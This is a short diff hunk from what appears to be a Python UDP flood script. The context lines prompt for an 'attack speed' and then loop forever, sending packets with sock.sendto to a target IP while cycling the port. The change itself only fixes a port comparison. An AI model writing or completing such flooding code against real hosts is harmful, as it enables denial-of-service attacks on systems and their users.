@@ -37,7 +37,7 @@ speed = int(input("attack speed (0-1000) : "))
 os.system("clear")
 
 sent = 0
-if port == "00000":
+if port == 00000:
      port = 1     
      while True:
           sock.sendto(bytes, (ip,port))
